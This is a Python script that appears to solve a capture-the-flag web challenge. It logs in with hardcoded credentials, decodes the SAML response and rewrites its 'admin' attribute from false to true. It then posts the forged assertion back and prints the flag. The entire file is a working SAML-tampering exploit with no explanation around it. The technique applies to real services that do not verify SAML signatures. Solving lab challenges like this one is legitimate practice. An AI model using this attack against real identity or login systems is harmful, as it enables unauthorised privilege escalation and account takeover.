import base64
import requests
import urllib 

url = 'http://on.acictf.com:'
port = '34056'
base = url + port
login = base + '/web/login'
login_post = base + '/simplesaml/module.php/core/loginuserpass.php?'
callback = base + '/web/login/callback'

data = {
    'username': 'joe',
    'password': 'letmein3'
}

s = requests.Session()
r = s.get(login)
data['AuthState'] = urllib.unquote(r.url.split('AuthState=')[1].replace('1544','2544'))
r = s.post(login_post, data=data)
SAMLResponse = r.content.split('name="SAMLResponse" value="')[1].split('"')[0]
SAMLResponse = base64.b64decode(SAMLResponse)
SAMLResponse = SAMLResponse.replace('Name="admin" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">false','Name="admin" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">true')
SAMLResponse = base64.b64encode(SAMLResponse)

r = s.post(callback, data={'SAMLResponse': SAMLResponse})
print 'ACI' + r.content.split('ACI')[1].split('}')[0] + '}'